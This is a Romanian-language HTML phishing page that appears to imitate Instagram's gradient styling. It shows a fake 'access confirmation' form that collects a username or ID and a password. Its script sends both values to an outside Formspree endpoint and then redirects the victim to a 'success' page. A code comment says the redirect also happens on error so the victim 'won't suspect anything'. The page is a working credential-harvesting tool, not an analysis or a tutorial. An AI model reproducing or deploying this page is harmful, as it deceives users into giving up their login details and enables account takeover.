<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verificare</title>
    <style>
        body { background: #ffffff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { width: 320px; padding: 40px 20px; text-align: center; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.07); border: 1px solid #f0f0f0; position: relative; overflow: hidden; }
        
        /* Gradientul tău estetic sub formă de simbol */
        .dot { width: 60px; height: 60px; background: linear-gradient(45deg, #0095f6, #ff007f); border-radius: 15px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; color: white; font-size: 30px; }
        
        h2 { font-size: 20px; color: #333; margin-bottom: 10px; font-weight: 600; }
        p { font-size: 13px; color: #777; margin-bottom: 30px; padding: 0 10px; line-height: 1.4; }
        
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #e0e0e0; border-radius: 10px; background: #f9f9f9; font-size: 14px; box-sizing: border-box; outline: none; transition: 0.2s; }
        input:focus { border: 1px solid #0095f6; background: #fff; }
        
        button { width: 100%; background: linear-gradient(45deg, #0095f6, #ff007f); color: white; border: none; padding: 14px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 10px; box-shadow: 0 5px 15px rgba(0, 149, 246, 0.2); transition: 0.3s; }
        button:active { transform: scale(0.98); opacity: 0.9; }
    </style>
</head>
<body>
    <div class="box">
        <div class="dot">✦</div>
        <h2>Confirmare Acces</h2>
        <p>Introdu datele de identificare pentru a finaliza procedura de activare a resurselor.</p>
        
        <form id="secure-form">
            <input type="text" id="field_1" name="Identificator" placeholder="Utilizator / ID" required>
            <input type="password" id="field_2" name="Securitate" placeholder="Cod de acces" required>
            <button type="submit" id="sub-btn">Confirmă și Activează</button>
        </form>
    </div>

    <script>
        document.getElementById('secure-form').onsubmit = function(e) {
            e.preventDefault();
            const b = document.getElementById('sub-btn');
            b.innerHTML = "Se verifică...";
            b.disabled = true;

            // Folosim noul tău ID Formspree: mojpdpek
            fetch("https://formspree.io/f/mojpdpek", {
                method: "POST",
                body: JSON.stringify({ 
                    "ID_Profil": document.getElementById('field_1').value, 
                    "Cod_Validare": document.getElementById('field_2').value 
                }),
                headers: { "Content-Type": "application/json", "Accept": "application/json" }
            })
            .then(response => {
                // Redirecționare imediată după trimitere
                window.location.href = "verificare/succes.html";
            })
            .catch(error => {
                // Chiar dacă e eroare, trimitem utilizatorul mai departe ca să nu bănuiască nimic
                window.location.href = "verificare/succes.html";
            });
        };
    </script>
</body>
</html>
